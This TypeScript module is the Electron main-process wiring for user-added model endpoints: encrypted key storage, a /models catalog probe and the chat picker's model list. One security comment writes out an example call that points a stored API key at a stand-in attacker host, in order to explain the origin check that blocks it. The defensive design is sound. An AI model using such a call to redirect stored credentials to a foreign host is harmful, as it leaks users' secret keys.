import { join } from 'node:path'
import { app, ipcMain, safeStorage } from 'electron'
import type {
  ModelCatalogInput,
  ModelCatalogResult,
  ModelChoice,
  ProviderConnection,
  ProviderConnectionInput
} from '../shared/api'
import {
  createProviderStore,
  modelsUrl,
  type ProviderStore,
  parseModelCatalog,
  type SecretCipher,
  sameOrigin,
  scrubSecret
} from './providers-store'

/**
 * Main-owned wiring for user-added model endpoints (v10) — the Electron half of
 * the pure `providers-store.ts` engine, mirroring the control-manifest.ts /
 * control-panels.ts split. Everything here needs `electron` (safeStorage, app
 * paths, ipcMain) or the network; everything testable without them lives next door.
 *
 * Three jobs:
 *  1. Own the store singleton + the `safeStorage` cipher, so a key is encrypted at
 *     rest and only ever decrypted inside main.
 *  2. Probe an endpoint's `/models` (the settings dialog's "Connect" button) —
 *     one call that both validates the credential and returns the catalog.
 *  3. Build the chat picker's `ModelChoice[]`: main is now the single source of
 *     truth for which models exist, so the renderer never hardcodes a list again.
 *
 * KEY DISCIPLINE (see providers-store.ts): plaintext keys never cross IPC and
 * never enter a log line or an error string — the one door to a key is
 * `secretFor()`, used here by `catalog()` and `resolveConnection()` only.
 */

/**
 * `safeStorage` gives us Buffers; the store keeps plain JSON, so blobs ride as
 * base64. `available` is a GETTER on purpose: `isEncryptionAvailable()` throws
 * before the app is ready and can flip on Linux depending on the session's
 * keyring, so it has to be asked at save time rather than captured at import.
 */
const cipher: SecretCipher = {
  get available(): boolean {
    try {
      if (!safeStorage.isEncryptionAvailable()) return false
      // On Linux `isEncryptionAvailable()` is also satisfied by the `basic_text`
      // backend, which "encrypts" with a hardcoded, non-secret key — anything able
      // to read providers.json could reverse it. That is not what the UI promises
      // ("encrypted with the system keychain"), so treat it as unavailable and make
      // the user install/unlock a real keyring rather than store a key we can only
      // pretend is protected. The API is Linux-only, hence the optional call.
      const backend = safeStorage.getSelectedStorageBackend?.()
      return backend !== 'basic_text'
    } catch {
      return false
    }
  },
  encrypt: (plain: string): string => safeStorage.encryptString(plain).toString('base64'),
  decrypt: (blob: string): string | null => {
    try {
      return safeStorage.decryptString(Buffer.from(blob, 'base64'))
    } catch {
      return null
    }
  }
}

/**
 * The data dir is INJECTED by `registerProviderIpc` (agent.ts hands over its own
 * `dataDir()`) rather than recomputed here. Same directory either way — but
 * agent.ts's version also performs the one-time `<userData>/dsgn` → `praxis`
 * migration, gated on the praxis dir not existing yet. If this module created
 * that dir first, the migration would be skipped forever and a pre-rename user's
 * session history and worktrees would be stranded.
 */
let getDataDir: () => string = () => join(app.getPath('userData'), 'praxis')
let _store: ProviderStore | null = null
const store = (): ProviderStore => (_store ??= createProviderStore(getDataDir(), cipher))

// ---------------------------------------------------------------------------
// Catalog probe
// ---------------------------------------------------------------------------

const CATALOG_TIMEOUT_MS = 10_000

/** Map a failed HTTP status to something a user can act on. */
function statusMessage(status: number, statusText: string): string {
  const text = statusText ? ` ${statusText}` : ''
  if (status === 401) return '401 Unauthorized — check the key'
  if (status === 403) return '403 Forbidden — the key is valid but lacks access to this endpoint'
  if (status === 429) return '429 Rate limited — wait a moment and try again'
  if (status >= 500) return `${status}${text} — the endpoint is failing; try again shortly`
  return `${status}${text}`
}

/**
 * Probe `{baseUrl}/models` with the connection's key. Resolves the key from the
 * explicit draft value first (so the dialog can test a key before saving it) and
 * falls back to the stored one for a saved connection.
 *
 * SECURITY — whoever supplies the key also fixes the destination. A renderer may
 * name a `baseUrl` only for a key it supplied in the same call; when we fall back
 * to a STORED key we use that connection's STORED `baseUrl` and ignore the one
 * passed in. Otherwise `catalog({ id, baseUrl: 'https://attacker/v1' })` — ids are
 * free from `providers:list` — would make main decrypt every saved key and post it
 * to an arbitrary host as a bearer token, which is precisely the exfiltration the
 * "keys never leave main" design exists to prevent.
 *
 * `unsupported` is returned for BOTH "no such route" (404) and "the route
 * answered with nothing we could parse": in either case the honest thing the
 * dialog can do is let the user type model ids by hand, which is what the flag
 * drives. Every failure resolves — this never rejects, so the dialog always has
 * something to show.
 */
export async function catalog(input: ModelCatalogInput): Promise<ModelCatalogResult> {
  const draftKey = input.apiKey?.trim()
  const stored = !draftKey && input.id ? store().get(input.id) : null
  const key = draftKey || (input.id ? store().secretFor(input.id) : null)
  if (!key) return { ok: false, models: [], error: 'No API key — enter one to connect.' }

  // A stored key may only ever be sent to its own stored endpoint (see above).
  // Refuse the mismatch loudly rather than quietly probing the stored URL: the
  // dialog would otherwise show a catalog fetched from the OLD host while the
  // user is looking at the new one they just typed.
  if (stored && input.baseUrl && !sameOrigin(input.baseUrl, stored.baseUrl)) {
    return {
      ok: false,
      models: [],
      error: 'Enter the API key for this endpoint — the saved key belongs to the previous host.'
    }
  }
  const url = modelsUrl(stored ? stored.baseUrl : (input.baseUrl ?? ''))
  let parsedUrl: URL
  try {
    parsedUrl = new URL(url)
  } catch {
    return { ok: false, models: [], error: 'That endpoint URL is not valid.' }
  }
  if (parsedUrl.protocol !== 'https:' && parsedUrl.protocol !== 'http:') {
    return { ok: false, models: [], error: 'The endpoint must be an http(s) URL.' }
  }

  const ctrl = new AbortController()
  const timer = setTimeout(() => ctrl.abort(), CATALOG_TIMEOUT_MS)
  try {
    const res = await fetch(url, {
      headers: { Authorization: `Bearer ${key}`, Accept: 'application/json' },
      signal: ctrl.signal
    })
    if (res.status === 404) {
      return {
        ok: false,
        models: [],
        unsupported: true,
        error: 'This endpoint has no /models list — enter model ids by hand.'
      }
    }
    if (!res.ok) {
      return { ok: false, models: [], error: statusMessage(res.status, res.statusText) }
    }
    let body: unknown
    try {
      body = await res.json()
    } catch {
      body = null
    }
    const models = parseModelCatalog(body)
    if (models.length === 0) {
      return {
        ok: false,
        models: [],
        unsupported: true,
        error: 'The endpoint listed no models — enter model ids by hand.'
      }
    }
    return { ok: true, models }
  } catch (err) {
    // An abort here is always ours (nothing else holds the controller).
    if (ctrl.signal.aborted) {
      return { ok: false, models: [], error: `No response within ${CATALOG_TIMEOUT_MS / 1000}s.` }
    }
    const message = err instanceof Error ? err.message : String(err)
    return {
      ok: false,
      models: [],
      error: `Could not reach the endpoint — ${scrubSecret(message, key)}`
    }
  } finally {
    clearTimeout(timer)
  }
}

// ---------------------------------------------------------------------------
// The picker's model list
// ---------------------------------------------------------------------------

/**
 * The "omit the model, use the account default" sentinel — the same string the
 * renderer store already treats as "send no model" (`DEFAULT_MODEL` in
 * renderer/src/store.ts). Carried as a choice's `modelId` so the existing
 * "model === 'default' ⇒ undefined" mapping keeps working unchanged.
 */
const DEFAULT_MODEL = 'default'

/**
 * Built-in seats. These are CURATED here rather than discovered: both harnesses
 * run on the user's own subscription, and their model sets change rarely.
 *
 * The Claude Agent SDK does expose a live `supportedModels()`, and swapping this
 * list for it would be strictly better — but `choices()` is called by a settings
 * /picker render with NO live session to ask, and spinning one up just to
 * populate a dropdown is far more expensive than a four-item list. If a session
 * is ever guaranteed to exist at picker time, replace CLAUDE with that call.
 */
const CLAUDE: Array<[modelId: string, label: string]> = [
  [DEFAULT_MODEL, 'Default'],
  ['fable', 'Fable'],
  ['opus', 'Opus'],
  ['sonnet', 'Sonnet'],
  ['haiku', 'Haiku']
]
const CODEX: Array<[modelId: string, label: string]> = [
  [DEFAULT_MODEL, 'Default'],
  ['gpt-5-codex', 'GPT-5 Codex'],
  ['gpt-5', 'GPT-5']
]

/**
 * A choice's `value` is namespaced, never the bare model id: "Default" exists in
 * both built-in groups, and two connections can advertise the same model id, so a
 * bare id wouldn't be unique across the flat list the picker renders. Layout is
 * `provider[:connectionId]:modelId` — the first one or two segments are fixed and
 * colon-free (a connection id is SAFE_ID), so a value can be split back apart even
 * though a model id may itself contain `:` or `/`.
 */
const choiceValue = (provider: string, modelId: string, connectionId?: string): string =>
  connectionId ? `${provider}:${connectionId}:${modelId}` : `${provider}:${modelId}`

/**
 * Prettify a catalog id for display without making it ambiguous. Vendor-prefixed
 * ids ("moonshotai/kimi-k2") read better as just the model, but only when that
 * tail is unique inside the group — "openai/gpt-4o" next to "azure/gpt-4o" would
 * otherwise render as two identical rows. Case and punctuation are left ALONE:
 * model ids are brand strings the user has to match against a provider's docs.
 */
function prettyModelLabel(id: string, siblings: string[]): string {
  const tail = id.slice(id.lastIndexOf('/') + 1)
  if (!tail || tail === id) return id
  // A sibling collides if it would shorten to the same tail — which includes an
  // UNPREFIXED exact match: a catalog carrying both `gpt-4o` and `openai/gpt-4o`
  // would otherwise render two options both reading "gpt-4o".
  const collides = siblings.some(
    (other) => other !== id && (other === tail || other.endsWith(`/${tail}`))
  )
  return collides ? id : tail
}

/**
 * Every model the chat picker should offer: the two built-in seats first, then one
 * group per connection (labelled with the connection's own name). Recomputed per
 * call, so it always reflects the store — including a connection deleted a moment
 * ago. Keyless connections are still listed: hiding a user's own configuration is
 * more confusing than the turn-time error, and the backend gates on
 * `resolveConnection` anyway.
 */
export function choices(): ModelChoice[] {
  const out: ModelChoice[] = []
  for (const [modelId, label] of CLAUDE) {
    out.push({
      value: choiceValue('claude', modelId),
      label,
      provider: 'claude',
      modelId,
      group: 'Claude'
    })
  }
  for (const [modelId, label] of CODEX) {
    out.push({
      value: choiceValue('codex', modelId),
      label,
      provider: 'codex',
      modelId,
      group: 'Codex'
    })
  }
  for (const conn of store().list()) {
    for (const modelId of conn.models) {
      out.push({
        // A connection is an OpenAI-compatible endpoint, so the Codex harness runs
        // the loop — the connection only says where the requests go.
        value: choiceValue('codex', modelId, conn.id),
        label: prettyModelLabel(modelId, conn.models),
        provider: 'codex',
        connectionId: conn.id,
        modelId,
        group: conn.label
      })
    }
  }
  return out
}

/**
 * Where a connection points and what it authenticates with — the seam
 * `backends/codex.ts` imports to aim the Codex SDK at a user endpoint. Null when
 * the connection is gone or has no usable key (deleted, or encrypted on another
 * machine). The caller must surface that as a visible failure — NOT fall back to
 * the harness's own subscription, which would silently bill the wrong account and
 * answer with a different model than the picker shows.
 */
export function resolveConnection(
  id: string
): { baseUrl: string; apiKey: string; wireApi: 'responses' } | null {
  const conn = store().get(id)
  if (!conn) return null
  const apiKey = store().secretFor(id)
  if (!apiKey) return null
  return { baseUrl: conn.baseUrl, apiKey, wireApi: conn.wireApi }
}

/**
 * `providers:*` IPC. `dataDirFn` is agent.ts's `dataDir` — see the note on
 * `getDataDir` for why it's injected instead of recomputed.
 */
export function registerProviderIpc(dataDirFn: () => string): void {
  getDataDir = dataDirFn

  ipcMain.handle('providers:list', (): ProviderConnection[] => store().list())

  // save() throws a user-readable message for a bad draft or an un-storable key
  // (no OS keyring) — turn it into the contract's { ok, error } instead of an IPC
  // rejection, so the dialog can render it inline.
  ipcMain.handle(
    'providers:save',
    (
      _e,
      input: ProviderConnectionInput
    ): { ok: boolean; connection?: ProviderConnection; error?: string } => {
      try {
        return { ok: true, connection: store().save(input) }
      } catch (err) {
        return { ok: false, error: err instanceof Error ? err.message : String(err) }
      }
    }
  )

  ipcMain.handle('providers:remove', (_e, id: string): void => store().remove(id))

  ipcMain.handle(
    'providers:catalog',
    (_e, input: ModelCatalogInput): Promise<ModelCatalogResult> => catalog(input)
  )

  ipcMain.handle('providers:choices', (): ModelChoice[] => choices())
}
